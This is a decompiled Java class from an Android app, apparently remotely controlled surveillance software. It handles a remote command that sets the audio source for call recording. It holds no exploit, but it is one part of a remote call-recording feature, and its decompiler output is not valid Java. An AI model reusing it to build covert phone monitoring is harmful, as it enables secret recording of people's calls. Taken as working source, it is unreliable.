package com.vvt.remotecommand.processor.d;

import com.vvt.remotecommand.RemoteCommand;
import com.vvt.remotecommand.exception.InvalidCommanFormatException;
import com.vvt.remotecommand.processor.RemoteCommandProcessor;
import com.vvt.remotecommand.processor.RemoteCommandProcessor.QueueCategory;
import com.vvt.remotecommand.processor.c;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.input.RmtCtrlInputCallRecordingAudioSource;
import com.vvt.remotecontrol.input.RmtCtrlInputCallRecordingAudioSource.AudioSource;
import java.util.ArrayList;

public class f
  extends RemoteCommandProcessor
{
  private static final boolean a = com.vvt.ak.a.a;
  
  public f(com.vvt.remotecontrol.a parama)
  {
    super(parama);
  }
  
  private void a(ArrayList paramArrayList)
  {
    boolean bool1 = a;
    if (bool1) {}
    int i = paramArrayList.size();
    int j = 1;
    if (i != j)
    {
      localObject = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      ((InvalidCommanFormatException)localObject).<init>();
      throw ((Throwable)localObject);
    }
    i = 0;
    Object localObject = null;
    try
    {
      localObject = paramArrayList.get(0);
      localObject = (String)localObject;
      i = Integer.parseInt((String)localObject);
      boolean bool2 = a;
      if (bool2) {}
      localObject = RmtCtrlInputCallRecordingAudioSource.AudioSource.forValue(i);
      if (localObject == null)
      {
        localObject = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
        ((InvalidCommanFormatException)localObject).<init>();
        throw ((Throwable)localObject);
      }
    }
    catch (Exception localException)
    {
      InvalidCommanFormatException localInvalidCommanFormatException = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      localInvalidCommanFormatException.<init>();
      throw localInvalidCommanFormatException;
    }
  }
  
  public void a(RemoteCommand paramRemoteCommand, c paramc)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = paramRemoteCommand.getParameters();
    a((ArrayList)localObject1);
    Object localObject2 = null;
    localObject1 = (String)((ArrayList)localObject1).get(0);
    int i = Integer.parseInt((String)localObject1);
    boolean bool3 = a;
    if (bool3) {}
    localObject2 = new com/vvt/remotecontrol/input/RmtCtrlInputCallRecordingAudioSource;
    ((RmtCtrlInputCallRecordingAudioSource)localObject2).<init>();
    Object localObject3 = RmtCtrlInputCallRecordingAudioSource.AudioSource.forValue(i);
    ((RmtCtrlInputCallRecordingAudioSource)localObject2).setAudioSource((RmtCtrlInputCallRecordingAudioSource.AudioSource)localObject3);
    boolean bool4 = a;
    if (bool4) {}
    localObject3 = h();
    ControlCommand localControlCommand = new com/vvt/remotecontrol/ControlCommand;
    RemoteFunction localRemoteFunction = RemoteFunction.SET_CALL_RECORDING_AUDIO_SOURCE;
    localControlCommand.<init>(localRemoteFunction, localObject2);
    bool3 = a;
    if (bool3) {}
    ((com.vvt.remotecontrol.a)localObject3).execute(localControlCommand);
    if (paramc != null)
    {
      localObject2 = new java/lang/StringBuilder;
      ((StringBuilder)localObject2).<init>();
      localObject3 = "Call recording's audio source is set to ";
      localObject2 = ((StringBuilder)localObject2).append((String)localObject3);
      localObject1 = RmtCtrlInputCallRecordingAudioSource.AudioSource.forValue(i).getName();
      localObject1 = (String)localObject1;
      bool3 = a;
      if (bool3) {}
      paramc.b(paramRemoteCommand, this, (String)localObject1);
    }
    boolean bool2 = a;
    if (bool2) {}
  }
  
  public RemoteCommandProcessor.QueueCategory d()
  {
    return RemoteCommandProcessor.QueueCategory.MAIN;
  }
  
  public String e()
  {
    return "ProcSetCallRecordingAudioSource";
  }
  
  public boolean f()
  {
    return true;
  }
  
  public long g()
  {
    return 0L;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/d/f.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */